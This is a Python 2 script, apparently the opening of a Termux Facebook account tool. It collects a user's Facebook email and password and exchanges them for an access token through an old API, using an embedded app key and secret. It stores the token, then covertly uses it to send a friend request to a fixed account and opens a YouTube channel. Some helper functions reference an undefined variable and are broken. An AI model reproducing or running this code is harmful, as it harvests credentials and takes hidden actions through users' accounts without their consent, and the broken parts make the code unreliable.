#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To NAWAZISH
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

#Dev:ALI_MEHAR
##### LOGO #####
logo = """

\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
\033[1;96m꧁༒☬ᤂℌ NAWAZISH ໔ℜ؏ৡ☬༒꧂
                 ;' ·,       ,         NAWAZISH         •98• 
         ;     '·, ,'·,  ' ·, 
         ',       ,'   ' ·,    ' ·, 
  , · " " ·,     :',       '·,      ' · ,          ,   ·  ' ; 
,"::' ·,::   ", ,':::' ,       ' · ,   ,  ,' ·  '            ; 
¦::                 ' ··,:::::':·,......  , ' 
",:::      ,":::::          ' ··,::,::,'_._._._._._._._._._', 
         ,"::::::          ´   , "      „ „",  ,"      „ „', 
        ,"::::                 ;     „"   ,"   ;     „"  ," 
        ;::::                   "„    ", "     ",  „ "„ " ; 
        ;:::       , "  "   "   "   "     „"·::::::::::::::"„- , 
        ;::      ,"                         "„·:::::::::::::·„" 
        ;::      ;                             "„·:::::::„" 
        ",::    ;         ,·'                       ", " 
          ",::   ",       '·,         ˆ ·,         ,·'    ,ˆ 
            ",::   ",                     ˆ · , ,' , · ˆ    ," 
            _",:::   ",_._._._._._._.      _._._ ," 
          ,'                             ,":::",          ', 
        ,'                            ,"::::::::",          ', 
       ,'                           ,' ",::::::::,",          ', 
      ,',.,. ,.,.,.,.,.,.,.,.,.,.,.,"   "::::"    ", 
         ,":::::                       ,":::",        º² "ALI
       ,":::                          ,"::::::",            ", 
      ,"::                          ,":::::::::",            ", 
     ,"::                          ,":::::::::::",            "
   |___'|.·´    NAWAZISH     -«
\033[1;91m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mNAWAZISH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
\033[1;92m:•◈•🏵️🏵️🏵️🏵️🏵️🏵️🏵️🏵️🏵️🏵️🏵️🏵️🏵️🏵️
\033[1;92m:•◈•║║─💐💐─────║🌷🌷─────║║     🌸
\033[1;93m:•◈•💮💮💮💮💮💮💮💮💮💮💮💮💮💮💮
\033[1;93m:•◈•║║║💐💐║╚╝║║═╣🌷🌷╔╗║╔═╣╚╝🌸   
\033[1;98m:•◈•║╚╣💐💐╠╗╔╣║═╣🌷🌷║╔╗║╚═╣╔🌸   NAWAZISH
\033[1;98m:•◈•🌺🌺🌺🌺🌺🌺🌺🌺🌺🌺🌺🌺🌺🌺
\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;95mNAWAZISH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;96m ALI_MEHAR
\033[1;96m╭╮╱╭┳━━━┳━━━┳╮╭━┳━━━┳━━━╮
\033[1;96m┃┃╱┃┃╭━╮┃╭━╮┃┃┃╭┫╭━━┫╭━╮┃
\033[1;96m┃╰━╯┃┃╱┃┃┃╱╰┫╰╯╯┃╰━━┫╰━╯┃
\033[1;96m┃╭━╮┃╰━╯┃┃╱╭┫╭╮┃┃╭━━┫╭╮╭╯
\033[1:96m┃┃╱┃┃╭━╮┃╰━╯┃┃┃╰┫╰━━┫┃┃╰╮
\033[1;96m╰╯╱╰┻╯╱╰┻━━━┻╯╰━┻━━━┻╯╰━╯
\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mNAWAZISH\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
jalan("\033[1;96m----------------------//\\")
jalan("\033[1;96m---------------------// ¤ \\")
jalan("\033[1;96m---------------------\\ ¤ //")
jalan("\033[1;96m---------------------- \\//")
jalan("\033[1;96m-------------------- (___)")
jalan("\033[1;96m---------------------(___)")
jalan("\033[1;96m---------------------(___)")
jalan("\033[1;96m---------------------(___)_________")
jalan("\033[1;96m--------\_____/\__/----\__/\_____/")
jalan("\033[1;96m------------\ _°_[------------]_ _° /")
jalan("\033[1;96m----------------\_°_¤ ---- ¤_°_/")
jalan("\033[1;96m--------------------\ __°__ /")
jalan("\033[1;96m---------------------|\_°_/|")
jalan("\033[1;96m---------------------[|\_/|]")
jalan("\033[1;96m---------------------[|[¤]|]")
jalan("\033[1;96m---------------------[|;¤;|]")
jalan("\033[1;96m---------------------[;;¤;[]")
jalan("\033[1;96m--------------------;;;;¤][]\ ")
jalan("\033[1;96m-------------------;;;;;¤][]-\ ")
jalan("\033[1;96m------------------;;;;;[¤][]--\ ")
jalan("\033[1;96m-----------------;;;;;|[¤][]---\ ")
jalan("\033[1;96m----------------;;;;;[|[¤][]|---| ")
jalan("\033[1;96m---------------;;;;;[|[¤]|]|---| ")
jalan("\033[1;96m----------------;;;;[|[¤]|/---/ ")
jalan("\033[1;96m-----------------;;;[|[¤]/---/ ")
jalan("\033[1;96m------------------;;[|[¤/---/ ")
jalan("\033[1;96m-------------------;[|[/---/ ")
jalan("\033[1;96m--------------------[|/---/ ")
jalan("\033[1;96m---------------------/---/ ")
jalan("\033[1;96m--------------------/---/|] ")
jalan("\033[1;96m-------------------/---/]|];")
jalan("\033[1;96m------------------/---/¤]|];;")
jalan("\033[1;96m-----------------|---|[¤]|];;;")
jalan("\033[1;96m-----------------|---|[¤]|];;;")
jalan("\033[1;96m------------------\--|[¤]|];;")
jalan("\033[1;96m-------------------\-|[¤]|]; ")
jalan("\033[1;96m---------------------\|[¤]|] ")
jalan("\033[1;96m----------------------\\¤// ")
jalan("\033[1;96m-----------------------\|/ ")
jalan("\033[1;96m------------------------V ")                                     
jalan("\033[1;96m------------------------------------")
jalan("\033[1;96m-------------------------------------")
jalan("\033[1;96m--------------------------------------")
jalan("\033[1;96m---------------------------------------")
jalan("\033[1;96m-----------------------------------------")
jalan("\033[1;96m------------------------------------------")
jalan("\033[1;96m-------------------------------------------")
jalan("\033[1;96m--------------------------------------------")
jalan("\033[1;96m----------------------------------------------")
jalan('\033[1;93m              Welcome to ZohaibPython Script')
print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mNAWAZISH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

CorrectUsername = "Zohaib"
CorrectPassword = "Boss"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;96mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;96mTool Password \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Zohaibkhan
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;98mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\033[1;98mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;93mWarning: \033[1;93mDo Not Use Your Personal Account' )
		jalan(' \033[1;93mWarning: \033[1;93mUse a New Account To Login' )
		jalan(' \033[1;93mWarning: \033[1;93mTermux  All version Work✅' )                 
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mNAWAZISH\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
		print('	' )
		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
		pwd = raw_input('\033[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;96mLogin Successful.•◈•..'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
